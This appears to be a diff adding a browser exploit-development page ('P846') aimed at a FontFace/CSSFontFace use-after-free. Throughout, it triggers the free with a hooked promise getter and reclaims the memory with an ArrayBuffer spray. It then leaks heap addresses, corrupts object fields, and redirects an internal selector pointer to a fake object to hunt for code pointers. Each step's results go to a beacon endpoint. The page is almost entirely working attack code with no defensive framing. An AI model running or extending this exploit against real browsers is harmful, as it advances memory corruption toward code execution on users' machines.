@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P846</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:11px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:6px;border-radius:4px;white-space:pre-wrap;word-break:break-all;max-height:93vh;overflow-y:auto;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P846: FontFace CSSFontFace Data-Flow Oracle — Code Pointer Hunt</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P846-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+function hexQ(v){return '0x'+v.toString(16).padStart(16,'0');}
+
+bn('BOOT','start');
+
+/* ============================================================
+   PHASE A: FontFace UAF — get AB(192) at H
+   ============================================================ */
+log('--- Phase A: FontFace UAF ---','hot');
+
+var fontAB=null,face=null,H=null,q13val=null;
+var stA=document.createElement('style');
+stA.textContent="@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(stA);
+face=new FontFace('f1',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var ffired=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(ffired)return undefined;
+    ffired=true;
+    if(stA){stA.remove();stA.textContent='';stA=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    var abs=[];
+    for(var i=0;i<80;i++)abs.push(new ArrayBuffer(192));
+    for(var i=0;i<abs.length;i++){
+      var bu=new BigUint64Array(abs[i]);
+      for(var j=0;j<bu.length;j++){
+        if(bu[j]!==BigInt(0)){fontAB=abs[i];break;}
+      }
+      if(fontAB)break;
+    }
+    return undefined;
+  },set:function(){}
+});
+document.fonts.load('1em f1, bb1','AB');
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  if(!fontAB){
+    bn('MISS','no-uaf-hit');
+    log('FontFace UAF MISSED — cannot continue','fail');
+    return;
+  }
+
+  var bu=new BigUint64Array(fontAB);
+  H=bu[11]-BigInt(0x68);
+  q13val=bu[13];
+  log('H = '+hexQ(H),'ok');
+  log('q13 = '+hexQ(q13val)+' (CSSFontSelector*)','ok');
+  bn('HEAP','H='+hexQ(H)+'|q13='+hexQ(q13val));
+
+  /* ============================================================
+     PHASE B: Full baseline dump of all 24 qwords
+     ============================================================ */
+  log('','');
+  log('--- Phase B: Baseline 192B dump ---','hot');
+
+  var baseline=[];
+  for(var i=0;i<24;i++){
+    baseline.push(bu[i]);
+  }
+
+  /* Dump with pointer classification */
+  var codeHits=[];
+  for(var i=0;i<24;i++){
+    var v=baseline[i];
+    var hi=Number(v>>BigInt(32));
+    var lo=Number(v&BigInt(0xFFFFFFFF));
+    var cls='info';
+    var tag='';
+    if(v===BigInt(0)){tag='(zero)';cls='';
+    } else if(hi===0 && lo<=0xFF){tag='(small)';
+    } else if(hi>=0x10 && hi<=0x1000){tag='(HEAP)';
+    } else if(hi>0x10 && hi<0x8000){tag='(CODE?)';cls='hot';codeHits.push('q'+i+'='+hexQ(v));
+    } else if(hi>=0xFFFF8000){tag='(KERN?)';cls='hot';codeHits.push('q'+i+'='+hexQ(v));
+    }
+    if(v!==BigInt(0)){
+      log('  q'+i.toString().padStart(2,' ')+' [+'+('0x'+(i*8).toString(16).padStart(3,'0'))+'] = '+hexQ(v)+' '+tag,cls);
+    }
+  }
+  bn('BASELINE','nz='+baseline.filter(function(v){return v!==BigInt(0)}).length+'|code='+codeHits.length);
+  if(codeHits.length>0){
+    log('  *** POTENTIAL CODE POINTERS: '+codeHits.join(', ')+' ***','hot');
+    bn('CODE-BASELINE',codeHits.join('|'));
+  }
+
+  /* ============================================================
+     PHASE C: m_status sweep — change status byte, call face.load()
+     CSSFontFace status enum: 0=Pending, 1=Loading, 2=Loaded, 3=TimedOut, 4=Failure
+     m_status at byte offset 130 (0x82)
+     ============================================================ */
+  log('','');
+  log('--- Phase C: m_status data-flow sweep ---','hot');
+
+  var u8=new Uint8Array(fontAB);
+  var STATUS_OFF=130;
+
+  for(var status=0;status<=4;status++){
+    /* Save current state */
+    var preDump=[];
+    for(var i=0;i<192;i++)preDump.push(u8[i]);
+
+    /* Set m_status */
+    u8[STATUS_OFF]=status;
+    bn('C-SET','status='+status+'|byte130='+u8[STATUS_OFF]);
+
+    /* Call face.load() — this should follow CSSFontFace pointers */
+    var loadErr=null;
+    try{
+      face.load();
+    }catch(e){
+      loadErr=e.name+':'+String(e.message).slice(0,50);
+    }
+    bn('C-LOAD','status='+status+'|err='+(loadErr||'none'));
+
+    /* Diff: find ALL bytes that changed */
+    var changes=[];
+    for(var i=0;i<192;i++){
+      if(u8[i]!==preDump[i]){
+        changes.push('+0x'+(i).toString(16).padStart(2,'0')+'=0x'+preDump[i].toString(16)+'->0x'+u8[i].toString(16));
+      }
+    }
+
+    /* Check for new code pointers in qwords */
+    var newCode=[];
+    for(var qi=0;qi<24;qi++){
+      var v=bu[qi];
+      if(v!==baseline[qi] && v!==BigInt(0)){
+        var hi=Number(v>>BigInt(32));
+        if(hi>0x10 && hi<0x8000){
+          newCode.push('q'+qi+'='+hexQ(v));
+        } else if(hi>=0xFFFF8000){
+          newCode.push('q'+qi+'='+hexQ(v)+'(KERN)');
+        }
+      }
+    }
+
+    var result='status='+status+'|changes='+changes.length+'|code='+newCode.length;
+    if(changes.length>0)result+='|diff='+changes.slice(0,8).join(',');
+    if(newCode.length>0)result+='|NEW_CODE='+newCode.join(',');
+    bn('C-DIFF',result);
+
+    log('  status='+status+': '+(loadErr?'ERR:'+loadErr:'load-ok')+
+      ' changes='+changes.length+
+      (changes.length>0?' ['+changes.slice(0,5).join(' ')+']':'')+
+      (newCode.length>0?' *** CODE: '+newCode.join(', ')+' ***':'')
+    , newCode.length>0?'hot':(changes.length>0?'ok':''));
+
+    /* Restore baseline for next test */
+    for(var i=0;i<192;i++)u8[i]=preDump[i];
+  }
+
+  /* ============================================================
+     PHASE D: face.loaded promise — does promise resolution write data?
+     ============================================================ */
+  log('','');
+  log('--- Phase D: face.loaded promise trace ---','hot');
+
+  var prePromise=[];
+  for(var i=0;i<192;i++)prePromise.push(u8[i]);
+
+  /* Set status to Pending (0) to see if promise writes on resolution */
+  u8[STATUS_OFF]=0;
+  var pResult='?';
+  try{
+    var p=face.loaded;
+    if(p && typeof p.then==='function'){
+      pResult='promise';
+    } else {
+      pResult='val='+String(p).slice(0,20);
+    }
+  }catch(e){
+    pResult='ERR:'+e.name;
+  }
+
+  bn('D-PROMISE','result='+pResult);
+  log('  face.loaded => '+pResult,'info');
+
+  /* Check for changes after 100ms */
+  setTimeout(function(){
+    var promiseChanges=[];
+    for(var i=0;i<192;i++){
+      if(u8[i]!==prePromise[i]){
+        promiseChanges.push('+0x'+(i).toString(16)+'=0x'+prePromise[i].toString(16)+'->0x'+u8[i].toString(16));
+      }
+    }
+    bn('D-DIFF','changes='+promiseChanges.length+'|'+promiseChanges.slice(0,8).join(','));
+    log('  Promise diff: '+promiseChanges.length+' changes'+
+      (promiseChanges.length>0?' ['+promiseChanges.slice(0,5).join(' ')+']':''),'info');
+
+    /* Restore */
+    for(var i=0;i<192;i++)u8[i]=prePromise[i];
+
+    phaseE();
+  },200);
+
+  /* ============================================================
+     PHASE E: Sentinel planting — write known values, trigger load,
+     check if font system READS from specific offsets and writes results.
+     ============================================================ */
+  function phaseE(){
+    log('','');
+    log('--- Phase E: Sentinel plant + load cycle ---','hot');
+
+    /* Plant sentinels at key offsets and trigger load */
+    var sentinelOffsets=[
+      {off:0x00,name:'refcount'},
+      {off:0x08,name:'+0x08'},
+      {off:0x10,name:'+0x10'},
+      {off:0x18,name:'+0x18'},
+      {off:0x20,name:'+0x20'},
+      {off:0x28,name:'+0x28'},
+      {off:0x30,name:'+0x30'},
+      {off:0x38,name:'+0x38'},
+      {off:0x40,name:'+0x40'},
+      {off:0x48,name:'+0x48'},
+      {off:0x50,name:'+0x50'},
+      {off:0x58,name:'q11-self'},
+      {off:0x60,name:'+0x60'},
+      {off:0x68,name:'q13-selector'},
+      {off:0x70,name:'+0x70'},
+      {off:0x78,name:'+0x78'},
+      {off:0x80,name:'near-status'},
+      {off:0x88,name:'+0x88'},
+      {off:0x90,name:'+0x90'},
+      {off:0xA0,name:'+0xA0'},
+      {off:0xB0,name:'m_thread'}
+    ];
+
+    /* For each qword offset: zero it, trigger load, see if font system rewrites it */
+    var eResults=[];
+    for(var si=0;si<sentinelOffsets.length;si++){
+      var s=sentinelOffsets[si];
+      var off=s.off;
+
+      /* Save original */
+      var origLo=bu[off/8];
+
+      /* Zero this specific qword */
+      bu[off/8]=BigInt(0);
+
+      /* Set status to Pending */
+      u8[STATUS_OFF]=0;
+
+      /* Trigger load */
+      var loadOk=true;
+      try{face.load();}catch(e){loadOk=false;}
+
+      /* Read back */
+      var newVal=bu[off/8];
+      var restored=(newVal===origLo);
+      var written=(newVal!==BigInt(0));
+
+      if(written || restored){
+        var hi=Number(newVal>>BigInt(32));
+        var isCode=(hi>0x10 && hi<0x8000);
+        var isKern=(hi>=0xFFFF8000);
+        var tag=isCode?'CODE!':isKern?'KERN!':restored?'restored':'written';
+        eResults.push(s.name+'='+hexQ(newVal)+'('+tag+')');
+        log('  '+s.name+' [+0x'+off.toString(16)+']: zeroed → '+hexQ(newVal)+' ['+tag+']',
+          (isCode||isKern)?'hot':'ok');
+      }
+
+      /* Restore */
+      bu[off/8]=origLo;
+      u8[STATUS_OFF]=baseline[STATUS_OFF/8]?Number(baseline[STATUS_OFF/8]&BigInt(0xFF)):2;
+    }
+
+    bn('E-RESULTS','n='+eResults.length+'|'+eResults.slice(0,10).join('|'));
+    if(eResults.length===0){
+      log('  NO fields rewritten by load() after zeroing','fail');
+    }
+
+    phaseF();
+  }
+
+  /* ============================================================
+     PHASE F: q13 redirect test — change CSSFontSelector* to point
+     to OUR AB(192), set up fake vtable, trigger load.
+     If font system dereferences fake selector and writes something
+     useful, we might see code addresses.
+     ============================================================ */
+  function phaseF(){
+    log('','');
+    log('--- Phase F: q13 redirect to self (fake CSSFontSelector) ---','hot');
+
+    /* Save original q13 and status */
+    var origQ13=bu[13];
+    var origStatus=u8[STATUS_OFF];
+
+    /* Point q13 (offset 0x68) to H itself — our AB becomes the "CSSFontSelector" */
+    /* At H+0 (which the font system reads as vtable ptr), we plant H itself.
+       At H+vtableMethodOffset, we plant 0 (should crash gracefully or skip). */
+    bu[13]=H; /* q13 → H */
+
+    /* Plant a fake vtable pointer at H+0 (= q0) → also point to H
+       This means vtable[0] = first qword at H = H itself.
+       The font system would try to call H as a function → crash. */
+    /* Instead, plant 0 at q0 → null vtable → should crash at first virtual call */
+    /* We're testing whether the font system READS anything from our fake selector
+       and WRITES it to a different offset before the crash */
+
+    /* Actually, let's be safer: plant original q0 (refcount=1) and see what happens */
+    /* The font system might read m_fontSelector->someField before making a virtual call */
+
+    /* Set status to Pending to trigger the loading path */
+    u8[STATUS_OFF]=0;
+
+    /* Save full state before */
+    var preFull=[];
+    for(var i=0;i<192;i++)preFull.push(u8[i]);
+
+    var redirectErr=null;
+    try{
+      face.load();
+    }catch(e){
+      redirectErr=e.name;
+    }
+
+    /* Check for ANY changes */
+    var fChanges=[];
+    for(var i=0;i<192;i++){
+      if(u8[i]!==preFull[i]){
+        fChanges.push('+0x'+(i).toString(16)+'=0x'+preFull[i].toString(16)+'->0x'+u8[i].toString(16));
+      }
+    }
+
+    /* Check for code pointers */
+    var fCode=[];
+    for(var qi=0;qi<24;qi++){
+      var v=bu[qi];
+      var hi=Number(v>>BigInt(32));
+      if(hi>0x10 && hi<0x8000)fCode.push('q'+qi+'='+hexQ(v));
+      if(hi>=0xFFFF8000)fCode.push('q'+qi+'='+hexQ(v)+'(KERN)');
+    }
+
+    bn('F-RESULT','err='+(redirectErr||'none')+'|changes='+fChanges.length+'|code='+fCode.length+
+      (fChanges.length>0?'|diff='+fChanges.slice(0,6).join(','):'')+
+      (fCode.length>0?'|CODE='+fCode.join(','):''));
+
+    log('  q13 redirect: '+(redirectErr?'ERR:'+redirectErr:'survived')+
+      ' changes='+fChanges.length+
+      (fChanges.length>0?' ['+fChanges.slice(0,4).join(' ')+']':'')+
+      (fCode.length>0?' *** CODE: '+fCode.join(', ')+' ***':'')
+    , fCode.length>0?'hot':(fChanges.length>0?'ok':'info'));
+
+    /* Restore */
+    bu[13]=origQ13;
+    u8[STATUS_OFF]=origStatus;
+
+    phaseG();
+  }
+
+  /* ============================================================
+     PHASE G: document.fonts.check() / fonts.forEach data flow
+     These operations walk the CSSFontFace without load().
+     ============================================================ */
+  function phaseG(){
+    log('','');
+    log('--- Phase G: fonts.check + fonts iteration ---','hot');
+
+    var preG=[];
+    for(var i=0;i<192;i++)preG.push(u8[i]);
+
+    /* Re-add the face to document.fonts (it was deleted in UAF trigger) */
+    var readded=false;
+    try{
+      document.fonts.add(face);
+      readded=true;
+    }catch(e){}
+
+    if(readded){
+      /* fonts.check walks all registered fonts */
+      try{
+        var checkResult=document.fonts.check('1em f1');
+        bn('G-CHECK','result='+checkResult);
+        log('  fonts.check(f1) = '+checkResult,'info');
+      }catch(e){
+        bn('G-CHECK-ERR',e.name);
+      }
+
+      /* Iteration */
+      try{
+        var count=0;
+        document.fonts.forEach(function(f){count++;});
+        bn('G-ITER','count='+count);
+      }catch(e){}
+
+      /* Diff */
+      var gChanges=[];
+      for(var i=0;i<192;i++){
+        if(u8[i]!==preG[i]){
+          gChanges.push('+0x'+(i).toString(16)+'=0x'+preG[i].toString(16)+'->0x'+u8[i].toString(16));
+        }
+      }
+
+      var gCode=[];
+      for(var qi=0;qi<24;qi++){
+        var v=bu[qi];
+        var hi=Number(v>>BigInt(32));
+        if(hi>0x10 && hi<0x8000)gCode.push('q'+qi+'='+hexQ(v));
+      }
+
+      bn('G-DIFF','changes='+gChanges.length+'|code='+gCode.length);
+      log('  fonts ops: changes='+gChanges.length+
+        (gCode.length>0?' *** CODE: '+gCode.join(', ')+' ***':''),'info');
+    } else {
+      bn('G-SKIP','readd-failed');
+      log('  Cannot re-add face to document.fonts','fail');
+    }
+
+    log('','');
+    log('====== P846 COMPLETE ======','hot');
+    bn('DONE','H='+hexQ(H)+'|q13='+hexQ(q13val));
+  }
+
+},500);
+</script></body></html>
